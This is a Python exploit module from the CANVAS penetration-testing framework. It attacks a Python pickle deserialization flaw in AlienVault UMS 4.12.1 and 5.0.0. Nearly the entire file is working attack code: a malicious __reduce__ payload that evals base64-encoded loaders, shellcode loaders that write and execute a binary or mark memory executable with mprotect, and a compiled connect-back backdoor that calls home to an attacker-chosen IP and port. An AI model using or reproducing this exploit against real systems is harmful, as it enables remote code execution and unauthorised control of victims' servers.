#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")


from exploitutils import *
from tcpexploit import tcpexploit
import cPickle
import shellcodeGenerator
import base64
import zlib
from MOSDEF.cc import cc_main, threadsafe_cc_main
from canvasengine import canvas_root_directory
from libs.canvasos import canvasos

NAME="AlienVault Deserialization"
DESCRIPTION="Un-pickling an untursted python object can result in remote code execution"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="alienvault.com"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["References"] = """
http://www.zerodayinitiative.com/advisories/ZDI-15-549
https://www.alienvault.com/forums/discussion/5830
"""

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux"] ]
PROPERTY['VERSION'] = [ "4.12.1",
                        "5.0.0"]

NOTES="""
All of these tests were evaluated on AlienVault's virtual appliances.

4.12.1 - Success
5.0.0  - Success
5.1.0  - Failed - the bug is still there but there's an iptables rule that prevents connections to port 40004.
5.1.1  - Failed - fix appears comprehensive (iptables rule prevents connection to port 40004, uses JSON instead of pickle)

"""

CHANGELOG="""
"""


safe_template_python_x86_mosdef_loader ="""
def mosdef_start():
    import os

    with open("/var/run/alienvault/impl", "wb") as handle:
        handle.write("INSERT_MOSDEF_HERE")

    os.system("chmod a+x /var/run/alienvault/impl")
    os.system("/var/run/alienvault/impl")

mosdef_start()
"""


# ./cback_mmap_universal_rwx.sc
unsafe_template_python_x86_mosdef_loader = """
def mosdef_start():
    import ctypes
    from ctypes import pythonapi

    payload_bytes = "INSERT_MOSDEF_HERE"
    payload = ctypes.create_string_buffer(payload_bytes, len(payload_bytes))

    PROT_NONE=0
    PROT_READ=1
    PROT_WRITE=2
    PROT_EXEC=4

    page_size = pythonapi.getpagesize()
    payload_addr = ctypes.addressof(payload)
    payload_size = ctypes.sizeof(payload)


    shellcode_page_lower = (payload_addr & ctypes.c_ulonglong(~(page_size-1)).value)
    shellcode_page_upper = ((payload_addr + payload_size) & ctypes.c_ulonglong(~(page_size-1)).value) + page_size
    shellcode_page_size = shellcode_page_upper - shellcode_page_lower

    pythonapi.mprotect(shellcode_page_lower, shellcode_page_size, PROT_READ|PROT_WRITE|PROT_EXEC)
    
    entry_point = ctypes.cast(payload, ctypes.CFUNCTYPE(ctypes.c_void_p))
    entry_point()
mosdef_start()
"""

python_x86_mosdef_loader = None

def escape_chars(string):
    return "".join(["\\x%02x" % ord(x) for x in string])

class PayloadObject(object):
    def __reduce__(self):
        global python_x86_mosdef_loader
        return (eval, ('eval(compile("import base64\\nexec (base64.b64decode(\\"%s\\"))", "", "exec"))' % (base64.b64encode(python_x86_mosdef_loader)),) )


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=40004
        self.host=""
        self.shellcode="\xcc" * 298
        self.badstring="\x00"
        self.setVersions()
        self.version=1
        self.done=0
        self.name=NAME    
        self.basepath="/"
        self.command=None #none by default. We want to try to automatically load MOSDEF
        self.ssl = 1

        self.mosdef_http = False
        self.mosdef_ssl = False
        self.mosdef_universal = False
        self.mosdef_encrypted = False
        
        return

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host=self.target.interface
        # self.port=40004
        # self.command=self.argsDict.get("command",self.command)
        # self.ssl=self.argsDict.get("ssl",self.ssl)
        # self.ssl = True
        return 
    
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        self.versions[1]=["AlienVault UMS 4.12.1"]
        self.versions[2]=["AlienVault UMS 5.0.0"]

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.LINUXMOSDEF_X64]
        
    def test(self):
        self.getargs()

        connection_failed = False
        
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))
            s.close()
        except:
            connection_failed = True
        
        return int(connection_failed)
    
    def run(self):
        global unsafe_template_python_x86_mosdef_loader
        global safe_template_python_x86_mosdef_loader
        global python_x86_mosdef_loader
        
        self.getargs()
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))


        self.log("Attacking %s:%d"%(self.host,self.port))
        
        ret=0
        
        if False:
            t_os = canvasos("Linux")
            t_os.arch = "X64"
            
            self.buildmosdeftrojan(self.callback.ip, self.callback.port,
                                   target_os=t_os, http=self.mosdef_http,
                                   ssl=self.mosdef_ssl,
                                   universal=self.mosdef_universal,
                                   encrypted=self.mosdef_encrypted)
            
            payload = escape_chars(self.mosdeftrojan)
            
            python_x86_mosdef_loader = safe_template_python_x86_mosdef_loader.replace("INSERT_MOSDEF_HERE", payload)
        else:
            payload = None
            
            try:
                os.unlink(os.path.join(canvas_root_directory, "cback_mmap_rwx.sc"))
            except IOError as e:
                pass
            except OSError as e:
                pass
            
            ip_bytes = ["%02x" % ord(byte) for byte in socket.inet_aton(self.callback.ip)]
            
            if len(ip_bytes) < 4:
                ip_bytes = "\x00"* (4-len(ip_bytes))
            
            cback_addr = "0x"+"".join(ip_bytes)
            cback_port = self.callback.port
            mosdef_type = 22

            cc_args = ["-c", "-k", "2.6", "-t", "24",
                       "-D", "__AMD64__",
                       "-D", "CBACK_ADDR=%s" % cback_addr,
                       "-D", "CBACK_PORT=%d" % cback_port,
                       "-D", "MOSDEF_TYPE=%d" % mosdef_type,
                       "-v",
                       "-m", "Linux",
                       "-p", "X64",
                       os.path.join(canvas_root_directory, "backdoors", "cback_mmap_rwx.c")]

            threadsafe_cc_main(cc_args)

            with open(os.path.join(canvas_root_directory, "cback_mmap_rwx.sc"), "rb") as handle:
                shellcode_data = handle.read()
                shellcode_data = ("A" if len(shellcode_data) % 2 != 0 else "") + shellcode_data 
                payload = escape_chars(shellcode_data)
                
            python_x86_mosdef_loader = unsafe_template_python_x86_mosdef_loader.replace("INSERT_MOSDEF_HERE", payload)

        pickled = cPickle.dumps(PayloadObject())

        s=self.gettcpsock()
        s.connect((self.host, self.port))

        self.websend(s, base64.b64encode(zlib.compress(pickled))+"\n")
        
        s.close()

        return 1

        
    
    def shutdown(self):
        self.done=1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
